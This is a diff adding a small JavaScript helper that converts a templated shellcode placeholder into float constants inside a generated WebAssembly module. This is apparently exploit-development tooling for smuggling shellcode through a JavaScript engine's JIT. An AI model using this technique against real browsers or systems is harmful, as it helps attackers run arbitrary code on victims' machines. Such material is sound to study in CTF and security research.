@@ -1,0 +1,20 @@
+let fi_buf = new ArrayBuffer(8); // shared buffer
+let f_buf = new Float64Array(fi_buf); // buffer for float
+let i_buf = new BigUint64Array(fi_buf); // buffer for bigint
+
+// convert bigint to float
+function itof(i) {
+    i_buf[0] = i;
+    return f_buf[0];
+}
+
+%shellcode%
+
+console.log('(module');
+console.log('  (func (export "main")');
+
+for (let i = 0; i < shellcode.length; i++) console.log('    f64.const ' + itof(shellcode[i]));
+
+console.log('    return');
+console.log('  )');
+console.log(')');
